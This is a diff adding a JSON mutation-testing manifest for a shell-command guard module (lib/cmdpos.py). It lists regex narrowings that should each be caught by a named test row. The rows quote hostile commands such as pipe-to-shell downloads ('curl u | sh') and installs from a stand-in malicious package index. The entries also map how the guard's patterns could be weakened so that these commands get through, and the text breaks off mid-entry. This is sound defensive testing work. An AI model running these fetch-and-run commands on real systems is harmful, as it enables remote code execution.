@@ -1,0 +1,509 @@
+{
+  "guard": "prefix-run-language-guard: prefix_run / interpreter_word / not_words in lib/cmdpos.py encode ONE command-position language shared by the anchor and the pipe trigger. Guard 1 (prefix_run arm: bounded word run, char classes, append-assign, word set), Guard 2 (not_words raises on a non-ASCII-alnum word at build time), and Guard 3 (interpreter_word's leftpath/expinner/exptail scans). Each bypass below removes or narrows one of them in ONE way and must turn its NAMED row red. A PASS covers those enumerated narrowings only, not every narrowing of the same constructs. NAMED, NOT NUMBERED.",
+  "target": "lib/cmdpos.py",
+  "digest_suites": [
+    "test_greenfield_golden.py",
+    "test_retrofit.py"
+  ],
+  "why": [
+    "REV 3 consolidated set.",
+    "Each bypass reddens a NAMED verdict/predicate row and the control escapes.",
+    "Guard 1 (prefix_run :787-802): g1foo word-set add; g1noplus drops the append '+'; g1asg16/g1red16/",
+    "g1path16 bound the assignment/glued-redirect/path runs to N=16 (rows run L=40, D2); name_upper/",
+    "name_nodigit/name_onechar narrow the _asg name class; red_gtonly/red_onedigit narrow _red; seg_noeq",
+    "narrows the shared _seg class. name_nodigit/name_onechar are CAUGHT BY EXISTING P1(c) rows (cited,",
+    "no new row, D3); the others get dedicated L=40 DEPENDENCE rows.",
+    "Guard 2 (not_words :676+): g2-drop-raise / g2-drop-isascii / g2-drop-isalnum / g2-assert-form (D4:",
+    "raise ValueError, never assert) / g2-twoloop-reintroduced (D5 iterator pin). Rows are build-time",
+    "unit rows in test_composition.py that pin the ValueError type.",
+    "Guard 3 (interpreter_word :897-903): leftpath/expinner/exptail run-bounding to {0,8}, each with its",
+    "own L=40 differential row (D1). Cost rows dropped (D10).",
+    "digest_suites [test_greenfield_golden, test_retrofit] declared so a digest move never fails the",
+    "control and a digest-only catch is flagged; every bypass is caught BEHAVIOURALLY. Control is a",
+    "not_words docstring edit that escapes both behavioural suites. Every find binds exactly once against",
+    "lib/cmdpos.py at the fix commit (D7); anti-rot + gate GUARD 4 enforce it.",
+    "REV 4 additions were built by Opus 4.8 agents under the 2026-09-15 operator ruling. Each new find binds exactly once at C3; each reddens its NAMED row. What each mutation edits is in its own `why`.",
+    "REV 5 inventory additions were built by Opus 4.8 agents under the same ruling. g-wordrun-bound's expect was re-pointed to the three-wrapper bare install 'sudo env time pip install evil' (round-4 MAJOR: the old 'sudo -u root' row never exercised the word run). What each mutation edits is in its own `why`."
+  ],
+  "mutations": [
+    {
+      "id": "g1foo",
+      "why": "word-set substitution: add one extra word to ALL_PREFIXES inside the not_words(...) call, removing `foo` from arm C's complement so a path-basename `foo` prefix stops matching",
+      "find": "not_words(ALL_PREFIXES, _seg)",
+      "replace": "not_words(ALL_PREFIXES + (\"foo\",), _seg)",
+      "expect": {
+        "test_substrate_differential.py": "prefix-run arm language [+foo path]"
+      }
+    },
+    {
+      "id": "g1noplus",
+      "why": "noplus narrowing: drop the optional `+` from the assignment operator, so an append-assignment `A+=1` prefix stops matching arm A",
+      "find": "\"[A-Za-z_][A-Za-z0-9_]*[+]?=\"",
+      "replace": "\"[A-Za-z_][A-Za-z0-9_]*=\"",
+      "expect": {
+        "test_substrate_differential.py": "prefix-run arm language [noplus bare]"
+      }
+    },
+    {
+      "id": "g1asg16",
+      "why": "assignment-bound narrowing (N=16): bound arm A's value run `_seg*` to `_seg{0,16}`, so a >16-char assignment value drops out of the language",
+      "find": "_asg + _seg + \"*\"",
+      "replace": "_asg + _seg + \"{0,16}\"",
+      "expect": {
+        "test_substrate_differential.py": "prefix-run arm language [asgbound]"
+      }
+    },
+    {
+      "id": "g1red16",
+      "why": "redirect-bound narrowing (N=16): bound arm B's glued-redirect run `_seg+` to `_seg{1,16}`, so a >16-char glued redirect target drops out of the language",
+      "find": "_red + _seg + \"+\"",
+      "replace": "_red + _seg + \"{1,16}\"",
+      "expect": {
+        "test_substrate_differential.py": "prefix-run arm language [redbound]"
+      }
+    },
+    {
+      "id": "g1path16",
+      "why": "path-bound narrowing (N=16): bound arm C's path run `nonspace*/` to `nonspace{0,16}/`, so a >16-char path segment before the basename drops out of the language",
+      "find": "\")\" + nonspace + \"*/\"",
+      "replace": "\")\" + nonspace + \"{0,16}/\"",
+      "expect": {
+        "test_substrate_differential.py": "prefix-run arm language [pathbound]"
+      }
+    },
+    {
+      "id": "name_upper",
+      "why": "_asg drops lowercase names; a lowercase VAR= no longer opens a command position (both substrates fail open on the install)",
+      "find": "_asg = \"[A-Za-z_][A-Za-z0-9_]*[+]?=\"",
+      "replace": "_asg = \"[A-Z_][A-Z0-9_]*[+]?=\"",
+      "expect": {
+        "test_substrate_differential.py": "prefix-run arm language [name_upper]"
+      }
+    },
+    {
+      "id": "name_nodigit",
+      "why": "_asg drops digits in the name tail; a name with a digit (PERL5OPT) is no longer an assignment",
+      "find": "_asg = \"[A-Za-z_][A-Za-z0-9_]*[+]?=\"",
+      "replace": "_asg = \"[A-Za-z_][A-Za-z_]*[+]?=\"",
+      "expect": {
+        "test_substrate_differential.py": "P1(c) assignment 'PERL5OPT=-d' before an invoker"
+      }
+    },
+    {
+      "id": "name_onechar",
+      "why": "_asg allows only single-char names; any multi-char name (FOO=1) is no longer an assignment",
+      "find": "_asg = \"[A-Za-z_][A-Za-z0-9_]*[+]?=\"",
+      "replace": "_asg = \"[A-Za-z_][+]?=\"",
+      "expect": {
+        "test_substrate_differential.py": "P1(c) assignment 'FOO=1' before an invoker"
+      }
+    },
+    {
+      "id": "red_gtonly",
+      "why": "_red drops '<'; a '<' input redirect no longer opens a command position",
+      "find": "_red = \"[0-9]*[<>]\"",
+      "replace": "_red = \"[0-9]*[>]\"",
+      "expect": {
+        "test_substrate_differential.py": "prefix-run arm language [red_gtonly]"
+      }
+    },
+    {
+      "id": "red_onedigit",
+      "why": "_red allows at most one fd digit; a two-digit fd (10>) no longer matches the glued redirect arm",
+      "find": "_red = \"[0-9]*[<>]\"",
+      "replace": "_red = \"[0-9]?[<>]\"",
+      "expect": {
+        "test_substrate_differential.py": "prefix-run arm language [red_onedigit]"
+      }
+    },
+    {
+      "id": "seg_noeq",
+      "why": "_seg drops '='; an '=' in an assignment value stops the _asg _seg* arm before its trailing space",
+      "find": "_seg = _dialect(nonspace)[\"noslash\"]",
+      "replace": "_seg = _dialect(nonspace)[\"noslash\"].replace(\"/\", \"/=\")",
+      "expect": {
+        "test_substrate_differential.py": "prefix-run arm language [seg_noeq]"
+      }
+    },
+    {
+      "id": "leftpath-run-bounded",
+      "why": "the optional leading-path scan `(/|HEAD nonspace*/)?` bounded to {0,8}: a pipe interpreter word behind a path segment longer than 8 chars (a nix-store / termux / vendored-toolchain bindir) stops matching and its deny is lost on both substrates.",
+      "find": "+ \"*/)?(\" + alt(INTERPRETERS)",
+      "replace": "+ \"{0,8}/)?(\" + alt(INTERPRETERS)",
+      "expect": {
+        "test_substrate_differential.py": "interpreter-word scan language leftpath"
+      }
+    },
+    {
+      "id": "expinner-run-bounded",
+      "why": "the expansion-head scan `(HEAD nonspace*[$`])` bounded to {0,8}: a command word whose literal prefix before its first $/backtick is longer than 8 chars (a long toolchain-triple interpreter name carrying a version expansion) stops matching the unmodellable-expansion arm and its deny is lost on both substrates.",
+      "find": "\"*[$`])\"",
+      "replace": "\"{0,8}[$`])\"",
+      "expect": {
+        "test_substrate_differential.py": "interpreter-word scan language expinner"
+      }
+    },
+    {
+      "id": "exptail-run-bounded",
+      "why": "the trailing scan `nonspace*` after the expansion mark bounded to {0,8}: an expansion command word whose remainder after $/backtick is longer than 8 chars (a long installer-defined shell-path variable) stops matching and its deny is lost on both substrates.",
+      "find": "\"*[$`])\" + nonspace + \"*\"",
+      "replace": "\"*[$`])\" + nonspace + \"{0,8}\"",
+      "expect": {
+        "test_substrate_differential.py": "interpreter-word scan language exptail"
+      }
+    },
+    {
+      "id": "g2-drop-raise",
+      "why": "raise-removal: the guard detects the bad word but does nothing. Every predicate row goes red; iter row stays green (still a single loop over sorted(words)).",
+      "find": "            raise ValueError(\"not_words: word %r is not ASCII-alphanumeric\" % w)\n",
+      "replace": "            pass\n",
+      "expect": {
+        "test_composition.py": "name_hyphen"
+      }
+    },
+    {
+      "id": "g2-drop-isascii",
+      "why": "predicate-weakening: drops the isascii() conjunct. Only a non-ASCII-but-alnum word (time-acute) now escapes the guard; every ASCII-non-alnum row still raises.",
+      "find": "if not (w.isascii() and w.isalnum()):",
+      "replace": "if not w.isalnum():",
+      "expect": {
+        "test_composition.py": "name_nonascii"
+      }
+    },
+    {
+      "id": "g2-drop-isalnum",
+      "why": "predicate-weakening: drops the isalnum() conjunct. Every ASCII-non-alnum word (hyphen, ], backslash, [, empty) now escapes; the non-ASCII row still raises.",
+      "find": "if not (w.isascii() and w.isalnum()):",
+      "replace": "if not w.isascii():",
+      "expect": {
+        "test_composition.py": "name_rbracket"
+      }
+    },
+    {
+      "id": "g2-twoloop-reintroduced",
+      "why": "D5 regression: splits the guard into a SEPARATE pre-pass over `words` and drops `words = tuple(words)`. A generator argument is drained by the pre-pass; sorted(words) then sees an empty set and the trie excludes nothing. Only the iterator-materialisation row sees it; all predicate rows (tuples) stay green.",
+      "find": "    words = tuple(words)\n    root = {}\n",
+      "replace": "    for _w in words:\n        if not (_w.isascii() and _w.isalnum()):\n            raise ValueError(_w)\n    root = {}\n",
+      "expect": {
+        "test_composition.py": "iter_materialize"
+      }
+    },
+    {
+      "id": "g2-assert-form",
+      "why": "D4 regression: rewrites the explicit `raise ValueError` as an `assert`. Under normal python it raises AssertionError (!= ValueError) so the type-pinned rows redden; under -O it is stripped entirely. Either way the predicate rows catch it.",
+      "find": "        if not (w.isascii() and w.isalnum()):\n            raise ValueError(\"not_words: word %r is not ASCII-alphanumeric\" % w)\n",
+      "replace": "        assert w.isascii() and w.isalnum(), w\n",
+      "expect": {
+        "test_composition.py": "name_lbracket"
+      }
+    },
+    {
+      "id": "sredbound",
+      "why": "spaced-redirect target bound (N=16): bound arm A' (the FOURTH nonabs arm, lib/cmdpos.py:806, `[0-9]*[<>]+ +` nonspace+ space) target run `nonspace+` -> `nonspace{1,16}`, so a spaced-redirect target longer than 16 chars drops out of the command-position language. Distinct from g1red16, which bounds arm B's GLUED `_red _seg+`; this arm has its own literal target run. Row runs L=40 (D2).",
+      "find": "\"|[0-9]*[<>]+ +\" + nonspace + \"+\"",
+      "replace": "\"|[0-9]*[<>]+ +\" + nonspace + \"{1,16}\"",
+      "expect": {
+        "test_substrate_differential.py": "prefix-run arm language [sredbound]"
+      }
+    },
+    {
+      "id": "sred_ltonly",
+      "why": "spaced-redirect operator drops '<': arm A' operator run `[0-9]*[<>]+` -> `[0-9]*[>]+`, so a spaced '<' INPUT redirect no longer opens a command position. Distinct from red_gtonly, which drops '<' from the `_red` VARIABLE (arm B, glued); arm A' carries its own literal `[<>]`, uncovered by red_gtonly (verified: red_gtonly leaves '0< x pip install evilpkg' deny/deny).",
+      "find": "\"|[0-9]*[<>]+ +\"",
+      "replace": "\"|[0-9]*[>]+ +\"",
+      "expect": {
+        "test_substrate_differential.py": "prefix-run arm language [sred_ltonly]"
+      }
+    },
+    {
+      "id": "sred_onedigit",
+      "why": "spaced-redirect fd run narrowed: arm A' fd run `[0-9]*` -> `[0-9]?`, so a two-digit fd prefix (10>) on a spaced redirect no longer matches. Distinct from red_onedigit, which narrows the `_red` VARIABLE (arm B, glued); arm A' carries its own literal `[0-9]*`, uncovered by red_onedigit.",
+      "find": "\"|[0-9]*[<>]+ +\"",
+      "replace": "\"|[0-9]?[<>]+ +\"",
+      "expect": {
+        "test_substrate_differential.py": "prefix-run arm language [sred_onedigit]"
+      }
+    },
+    {
+      "id": "sred_oneop",
+      "why": "spaced-redirect operator run narrowed to one: arm A' operator run `[<>]+` -> `[<>]`, so a spaced multi-operator redirect (append '>>') no longer matches. CAUGHT BY THE EXISTING _AMB_LANG row 'language guard: redirect, spaced target' (`2>> o pip install evil`), so per D3 NO new row is added and this mutation cites that row. Measured: under this mutation exactly that check reddens (green at C3); the other _AMB_LANG redirect rows (glued `2>>o`, `>>`, `2>>>`, `2>> >o`) stay deny because they do not travel arm A' as a clean two-operator spaced form.",
+      "find": "\"|[0-9]*[<>]+ +\"",
+      "replace": "\"|[0-9]*[<>] +\"",
+      "expect": {
+        "test_substrate_differential.py": "language guard: redirect, spaced target"
+      }
+    },
+    {
+      "id": "wrapbound",
+      "why": "the wrapper arm's optional leading-path scan `(/|HEAD nonspace*/)?` (lib/cmdpos.py:821-822, the SIBLING of Guard 3's interpreter_word leftpath) bounded to {0,8}: a command-position wrapper behind a path segment longer than 8 chars (a vendored-toolchain / nix-store bindir) stops matching the wrapper arm, so the install word is no longer read at the command position and its deny is lost on both substrates.",
+      "find": "+ \"*/)?(\" + alt(ALL_PREFIXES)",
+      "replace": "+ \"{0,8}/)?(\" + alt(ALL_PREFIXES)",
+      "expect": {
+        "test_substrate_differential.py": "prefix-run wrapper leftpath [wrapbound]"
+      }
+    },
+    {
+      "id": "wrap-noslash",
+      "why": "the wrapper arm's `/|` alternative -- the branch that keeps the single leading byte `/` (lib/cmdpos.py:821) -- dropped: a wrapper reached through a bare leading slash (`/env`, no directory) no longer matches the wrapper arm, because the surviving `HEAD nonspace*/` branch needs an interior `/`; its deny is lost on both substrates.",
+      "find": "wrapper = (\"((/|\"",
+      "replace": "wrapper = (\"((\"",
+      "expect": {
+        "test_substrate_differential.py": "prefix-run wrapper leftpath [noslash]"
+      }
+    },
+    {
+      "id": "g3-alt1-nobacktick",
+      "why": "expansion arm alt1 mark narrowing: [$`] -> [$] (drop the backtick from the BARE $/backtick at the pipe command head). A command word that is a bare-backtick expansion at the head (curl u | `sh) stops matching and its deny is lost on both substrates. The three run-bound g3 rows carry a $ mark (expinner/exptail) or travel arm A (leftpath), so none reddens; this is the F01 backtick-in-alt1 narrowing.",
+      "find": "\"|([$`]|\"",
+      "replace": "\"|([$]|\"",
+      "expect": {
+        "test_substrate_differential.py": "bare backtick head"
+      }
+    },
+    {
+      "id": "g3-alt2-nobacktick",
+      "why": "expansion arm alt2 mark narrowing: [$`] -> [$] (drop the backtick from the $/backtick that FOLLOWS a literal head run). A command word carrying a backtick expansion after its head (curl u | ba`true`sh) stops matching and its deny is lost on both substrates. expinner/exptail rows use a $ mark, so none reddens; this is the ENOBT2 narrowing the round-3 blocker named.",
+      "find": "\"*[$`])\"",
+      "replace": "\"*[$])\"",
+      "expect": {
+        "test_substrate_differential.py": "backtick after a head run"
+      }
+    },
+    {
+      "id": "g3-alt2-nodollar",
+      "why": "citing mutation for an enumerated narrowing already caught by an existing row: drops the `$` from interpreter_word's alt2 expansion mark [$`]->[`] (exparm ENODOL2). The sibling $-drop is already caught by the EXISTING interpreter-word expinner verdict row, so no new row is owed.",
+      "find": "\"*[$`])\"",
+      "replace": "\"*[`])\"",
+      "expect": {
+        "test_substrate_differential.py": "interpreter-word scan language expinner"
+      }
+    },
+    {
+      "id": "g3-drop-alt2head",
+      "why": "citing mutation for an enumerated narrowing already caught by an existing row: drops interpreter_word's entire alt2 expansion head `|HEAD nonspace*[$`]` (exparm EDROPHEAD). Already caught by the EXISTING interpreter-word expinner verdict row, so no new row is owed.",
+      "find": "\"|([$`]|\" + _dialect(nonspace)[\"head\"] + nonspace\n            + \"*[$`])\"",
+      "replace": "\"|([$`])\"",
+      "expect": {
+        "test_substrate_differential.py": "interpreter-word scan language expinner"
+      }
+    },
+    {
+      "id": "g3-alt1-nodollar",
+      "why": "citing mutation for an enumerated narrowing already caught by an existing row: drops the `$` from interpreter_word's alt1 expansion mark [$`]->[`] (exparm ENODOL1). The sibling $-drop is already caught by the EXISTING interpreter-word exptail verdict row, so no new row is owed.",
+      "find": "\"|([$`]|\"",
+      "replace": "\"|([`]|\"",
+      "expect": {
+        "test_substrate_differential.py": "interpreter-word scan language exptail"
+      }
+    },
+    {
+      "id": "g3-drop-alt1",
+      "why": "citing mutation for an enumerated narrowing already caught by an existing row: drops interpreter_word's entire alt1 expansion mark `[$`]|` (exparm EDROP_ALT1). Already caught by the EXISTING interpreter-word exptail verdict row, so no new row is owed.",
+      "find": "\"|([$`]|\"",
+      "replace": "\"|(\"",
+      "expect": {
+        "test_substrate_differential.py": "interpreter-word scan language exptail"
+      }
+    },
+    {
+      "id": "g-kw-nobang",
+      "why": "citing mutation for an enumerated narrowing already caught by an existing row: drops `!` from KEYWORDS so prefix_run's keyword arm no longer skips a leading `!` (enumrest g-kw-nobang). Already caught by the EXISTING X-36v/w anchor row 'the ANCHOR, not the walkers: a direct install behind !', so no new row is owed.",
+      "find": "KEYWORDS = (\"then\", \"else\", \"do\", \"elif\", \"if\", \"while\", \"until\", \"!\")",
+      "replace": "KEYWORDS = (\"then\", \"else\", \"do\", \"elif\", \"if\", \"while\", \"until\")",
+      "expect": {
+        "test_substrate_differential.py": "the ANCHOR, not the walkers: a direct install behind"
+      }
+    },
+    {
+      "id": "g-interp-trail-noparen",
+      "why": "citing mutation for an enumerated narrowing already caught by an existing row: drops `)` from interpreter_word's interpreter-arm trailing context (ws|$|[;)]) at the INTERP_SUFFIX site (enumrest g-interp-trail-noparen). Already caught by the EXISTING \"P1 trigger sees '(sh)'\" verdict row, so no new row is owed.",
+      "find": "INTERP_SUFFIX\n            + \"(\" + ws + \"|$|[;)])\"",
+      "replace": "INTERP_SUFFIX\n            + \"(\" + ws + \"|$|[;])\"",
+      "expect": {
+        "test_substrate_differential.py": "P1 trigger sees '(sh)'"
+      }
+    },
+    {
+      "id": "g-namedgrp-nocoproc",
+      "why": "citing mutation for an enumerated narrowing already caught by an existing row: drops `coproc` from NAMED_GROUP_HEADS so prefix_run's named-group arm no longer skips a `coproc` head (enumrest g-namedgrp-nocoproc). Already caught by the EXISTING 'the anchor behind coproc' verdict row, so no new row is owed.",
+      "find": "NAMED_GROUP_HEADS = (\"function\", \"coproc\")",
+      "replace": "NAMED_GROUP_HEADS = (\"function\",)",
+      "expect": {
+        "test_substrate_differential.py": "the anchor behind `coproc`"
+      }
+    },
+    {
+      "id": "g-wordrun-bound",
+      "why": "bounds prefix_run's multi-wrapper word run (nonspace+ space)* to {0,1} (enumrest g-wordrun-bound). A bare install behind three or more DISTINCT wrapper words then fails open. Pinned by the behavioural row 'sudo env time pip install evil' (tsd arity block): a genuine three-wrapper BARE install, deny at C3'' and allow under this bound on both substrates (measured). NOT pinned by the _AMB_LANG 'language guard: multi-wrapper run' row (tsd:4452): its `curl | ...` head denies through a separate route regardless of the word run, and its tail sits inside `bash -c '...'` caught by the inner-command-string detector -- so that row stays deny under the bound (measured). The earlier expect on 'sudo -u root pip install evil' (a single wrapper + `-u root` flag words in the arity block) reddened for a token-count reason but is not a multi-wrapper install.",
+      "find": "\"(\" + nonspace + \"+\" + space + \")*\"",
+      "replace": "\"(\" + nonspace + \"+\" + space + \"){0,1}\"",
+      "expect": {
+        "test_substrate_differential.py": "'sudo env time pip install evil'"
+      }
+    },
+    {
+      "control": true,
+      "id": "control-inert-docstring",
+      "why": "a clause appended inside not_words' docstring at lib/cmdpos.py:667: ast-stripped by test_composition._code_only, never emitted, and never read as source by test_substrate_differential, so BOTH behavioural suites stay green and no golden/retrofit digest moves. MEASURED green on golden/retrofit/composition by the gate agent (digest_probe.out).",
+      "find": "THE SINK IS WRITTEN ONCE.",
+      "replace": "THE SINK IS WRITTEN ONCE, INDEED.",
+      "expect": {
+        "test_substrate_differential.py": null,
+        "test_composition.py": null
+      }
+    },
+    {
+      "id": "head_noupper_ere",
+      "why": "DIAL-HEAD (_DIALECT head class, ERE dialect): narrow the leftpath/expansion head class `[^ ({]` to exclude uppercase (`[^ ({A-Z]`), so an uppercase-leading path-prefixed wrapper/interpreter stops matching on the SHELL substrate and its deny is lost. The head class is consumed at the wrapper leftpath (:821), interpreter leftpath (:900) and expansion arm (:903); this one _DIALECT edit narrows all three at once. Measured at C3'': ABC/env deny->allow on shell (sdk stays deny), reddening the new row.",
+      "find": "\"head\": \"[^ ({]\"",
+      "replace": "\"head\": \"[^ ({A-Z]\"",
+      "expect": {
+        "test_substrate_differential.py": "prefix-run wrapper leftpath [head_upper]"
+      }
+    },
+    {
+      "id": "head_noupper_bs",
+      "why": "DIAL-HEAD (_DIALECT head class, \\S dialect): narrow the Python-side head class `[^\\s({]` to exclude uppercase (`[^\\s({A-Z]`), so an uppercase-leading path head stops matching on the SDK substrate and its deny is lost. Twin of head_noupper_ere on the other dialect row; reddens the same new row via the SDK substrate (ABC/env sdk->allow, shell stays deny).",
+      "find": "\"head\": \"[^\\\\s({]\"",
+      "replace": "\"head\": \"[^\\\\s({A-Z]\"",
+      "expect": {
+        "test_substrate_differential.py": "prefix-run wrapper leftpath [head_upper]"
+      }
+    },
+    {
+      "id": "seg_noupper_ere",
+      "why": "DIAL-NOSLASH (_DIALECT noslash class, ERE dialect): narrow the noslash class `[^/ ]` (consumed as _seg at :790) to exclude uppercase (`[^/ A-Z]`), so an assignment/redirect prefix with an uppercase _seg value stops matching arm A/B on the SHELL substrate. CITES an EXISTING row (no new row): the shipped `LC_ALL=C` pipe-stage assignment row already exercises the uppercase-value _seg membership. Measured at C3'': curl|LC_ALL=C python3 deny->allow on shell, reddening that row.",
+      "find": "\"noslash\": \"[^/ ]\"",
+      "replace": "\"noslash\": \"[^/ A-Z]\"",
+      "expect": {
+        "test_substrate_differential.py": "P1(c) assignment 'LC_ALL=C' costs the exemption"
+      }
+    },
+    {
+      "id": "seg_noupper_bs",
+      "why": "DIAL-NOSLASH (_DIALECT noslash class, \\S dialect): narrow the Python-side noslash class `[^/\\s]` to exclude uppercase (`[^/\\sA-Z]`), so an uppercase _seg value stops matching on the SDK substrate. Twin of seg_noupper_ere; cites the same existing `LC_ALL=C` row via the SDK substrate (curl|LC_ALL=C python3 sdk->allow, shell stays deny). No new row.",
+      "find": "\"noslash\": \"[^/\\\\s]\"",
+      "replace": "\"noslash\": \"[^/\\\\sA-Z]\"",
+      "expect": {
+        "test_substrate_differential.py": "P1(c) assignment 'LC_ALL=C' costs the exemption"
+      }
+    },
+    {
+      "id": "iw-leftpath-slashalt",
+      "why": "interpreter_word's leftpath `/|` alternative -- the branch that keeps the single leading byte `/` (lib/cmdpos.py:900) -- dropped: a pipe-fed interpreter reached through a bare leading slash (`/sh`, no directory) no longer matches interpreter_word, because the surviving `HEAD nonspace*/` branch needs an INTERIOR `/`; its deny is lost on both substrates. TWIN of wrap-noslash, whose find (`wrapper = (\"((/|\"`) binds only the prefix_run copy at :821; interpreter_word's `return (\"((/|\"` copy at :900 was pinned by NOTHING. Measured 2026-09-16 at C3'' 36c4be20: base deny/deny, mutant allow/allow; interior-slash `/bin/sh` and plain `sh` stay deny; whole suite 4278/0 under the narrowing (no fixed row moved), so this new row is the only behavioural catch.",
+      "find": "return (\"((/|\"",
+      "replace": "return (\"((\"",
+      "expect": {
+        "test_substrate_differential.py": "interpreter-word leftpath [slashalt]"
+      }
+    },
+    {
+      "id": "iw-interp-alt-nonode",
+      "why": "citing mutation for an enumerated narrowing already caught by existing rows: drops `node` from INTERPRETERS (lib/cmdpos.py:360-361) so interpreter_word's `alt(INTERPRETERS)` at :901 no longer matches a `node` pipe command word. Already caught by the EXISTING hardcoded row `curl -s http://x.test/a.json | node -p '1'` (and five sibling node rows), so per D3 NO new row is added and this mutation cites that row. Measured 2026-09-16 at C3'': exactly six node rows redden (test_substrate_differential 4271/6), test_composition stays 163/0 (`node` is in no source-count list).",
+      "find": "\"node\", \"php\"",
+      "replace": "\"php\"",
+      "expect": {
+        "test_substrate_differential.py": "node -p '1'"
+      }
+    },
+    {
+      "id": "pr-wrap-prefixalt-nodoas",
+      "why": "wrapper-arm word-set narrowing: drops `doas` from ALL_PREFIXES (via PREFIXES at lib/cmdpos.py:134) so prefix_run's wrapper arm `alt(ALL_PREFIXES)` at :822 no longer skips a `doas` privilege-wrapper prefix; `curl | doas sh` fails open on both substrates. The AXIS-7 loop at tests/test_substrate_differential.py:2281 is GENERATED from ALL_PREFIXES, so a member drop SHRINKS that loop rather than reddening it, and `doas` is not one of the five source-count words test_composition pins (:101); this hardcoded row is the only behavioural catch. Measured 2026-09-16 at C3'' 36c4be20: base deny/deny, mutant allow/allow.",
+      "find": "\"sudo\", \"doas\", \"nohup\"",
+      "replace": "\"sudo\", \"nohup\"",
+      "expect": {
+        "test_substrate_differential.py": "prefix-run wrapper alt [prefix-drop]"
+      }
+    },
+    {
+      "id": "pr-nonabs-braceclass-noleftbrace",
+      "why": "citing mutation for an enumerated narrowing already caught by an existing row: drops `{` from prefix_run's nonabs arm-0 leading brace/paren class `[({]` at lib/cmdpos.py:793, so a `{ ` brace-group opener before the interpreter no longer matches the first nonabs arm. Already caught by the EXISTING `P1 trigger sees '{ sh; }'` row (`curl http://x.test/a | { sh; }`), so no new row is owed. The paren `(` branch is unaffected (measured: `curl | ( sh` stays deny). Measured 2026-09-16 at C3'' 36c4be20.",
+      "find": "\"([({] *\"",
+      "replace": "\"([(] *\"",
+      "expect": {
+        "test_substrate_differential.py": "P1 trigger sees '{ sh; }'"
+      }
+    },
+    {
+      "id": "nonabs-bracespace",
+      "why": "narrow the nonabs brace arm's space run `[({] *` -> `[({]`, so a leading brace/paren FOLLOWED BY A SPACE (`| { npx evil`, `| ( /bin/sh)`) no longer opens a command position. Inventory site PR-NONABS-BRACESPACE (lib/cmdpos.py:793); pinned by no REV4 mutation. Caught behaviourally by the existing `'{ npx evil'` row (measured 2026-09-16 at C3'' tree 36c4be20: reddens ONLY under this narrowing among the four sites3 sites; deny/deny at C3'').",
+      "find": "(\"([({] *\"",
+      "replace": "(\"([({]\"",
+      "expect": {
+        "test_substrate_differential.py": "'{ npx evil'"
+      }
+    },
+    {
+      "id": "trailbrace-class",
+      "why": "narrow the trailing space-free brace arm's class `[({]*` -> `[(]*`, dropping `{`, so a `{` glued after a wrapper (`env {pip install evil`, `| env {/bin/sh)`) no longer opens a command position. Inventory site PR-TRAILBRACE-CLASS (lib/cmdpos.py:857); the docstring's claim of test_composition coverage was never a gate entry. Caught behaviourally by the existing `language guard: wrapper + glued brace, sudo` row (measured 2026-09-16 at C3'': reddens ONLY under this narrowing among the four sites3 sites; deny/deny at C3'').",
+      "find": "\"[({]*)?\"",
+      "replace": "\"[(]*)?\"",
+      "expect": {
+        "test_substrate_differential.py": "language guard: wrapper + glued brace, sudo"
+      }
+    },
+    {
+      "id": "trailbrace-rep",
+      "why": "bound the trailing space-free brace arm's repetition `[({]*` -> `[({]{0,1}`, so TWO OR MORE glued braces/parens after a wrapper (`| env ((/bin/sh)`) no longer match. Inventory site PR-TRAILBRACE-REP (lib/cmdpos.py:857). SILENT at C3'': measured 2026-09-16 (tree 36c4be20) NO existing behavioural verdict row reddens under this bound (only a cost row, a false red by this item's rule), so a dedicated sole-matcher row is added in tests/test_substrate_differential.py. Two PARENS (not braces) so the trailbrace-class narrowing leaves the row deny; a path interpreter so iw-leftpath-opt leaves it deny.",
+      "find": "\"[({]*)?\"",
+      "replace": "\"[({]{0,1})?\"",
+      "expect": {
+        "test_substrate_differential.py": "prefix-run arm language [trailbrace-rep]"
+      }
+    },
+    {
+      "id": "iw-leftpath-opt",
+      "why": "drop the `?` making interpreter_word's leading-path group MANDATORY: `((/|HEAD nonspace*/)?(INTERPRETERS)` -> `((/|HEAD nonspace*/)(INTERPRETERS)`, so a bare path-less interpreter after a pipe (`curl u | python3`, `curl u | sh`) no longer matches. Inventory site IW-LEFTPATH-OPT (lib/cmdpos.py:900); the twin prefix_run wrapper `?`-drop (PR-WRAP-OPT) is declared out-of-set as covered, but the interpreter_word copy was pinned by no mutation. Caught behaviourally by 220 existing rows (measured 2026-09-16 at C3''); cites one exclusive unique-substring sole-matcher `'curl http://x.test/i.py | python3'` (reddens ONLY under this narrowing among the four sites3 sites; deny/deny at C3'').",
+      "find": "\"*/)?(\" + alt(INTERPRETERS)",
+      "replace": "\"*/)(\" + alt(INTERPRETERS)",
+      "expect": {
+        "test_substrate_differential.py": "'curl http://x.test/i.py | python3'"
+      }
+    },
+    {
+      "id": "fdclass",
+      "why": "fd-digit-class membership (inventory PR-RED-FDCLASS, lib/cmdpos.py:792): drop `0` from the `_red` fd class `[0-9]*[<>]` -> `[1-9]*[<>]`, so a GLUED redirect whose file descriptor carries a `0` (e.g. `0>`) no longer matches arm B (`_red _seg+`) and drops out of the language. red_gtonly (drop `<`) and red_onedigit (one-digit bound) both leave `0>` matching (verified per-mutant: `0>` matches under base/red_gtonly/red_onedigit, fails under fdclass).",
+      "find": "_red = \"[0-9]*[<>]\"",
+      "replace": "_red = \"[1-9]*[<>]\"",
+      "expect": {
+        "test_substrate_differential.py": "[fdclass]: fd-0 glued redirect"
+      }
+    },
+    {
+      "id": "tokenrep",
+      "why": "word-run INNER per-token run (inventory PR-WORDRUN-TOKENREP, lib/cmdpos.py:856): narrow the word run's inner `nonspace+` -> `nonspace{1,16}` inside `(nonspace+ space)*`, so a single >16-char token behind a wrapper drops the word run and the command word after it escapes command position. g-wordrun-bound bounds the OUTER star (one whole token still survives), so it does NOT pin this inner token length. Caught by an EXISTING behavioural row (D3): `sudo PIP_INDEX_URL=http://evil.test/simple pip install requests` carries a 37-char token behind sudo; it flips deny->allow only under this inner bound (g-wordrun-bound leaves it deny -- one token survives -- and the token is behind a wrapper so no arm-A/_seg mutation touches it).",
+      "find": "\"(\" + nonspace + \"+\" + space + \")*\"",
+      "replace": "\"(\" + nonspace + \"{1,16}\" + space + \")*\"",
+      "expect": {
+        "test_substrate_differential.py": "sudo PIP_INDEX_URL=http://evil.test/simple pip install requests"
+      }
+    },
+    {
+      "id": "trailopt",
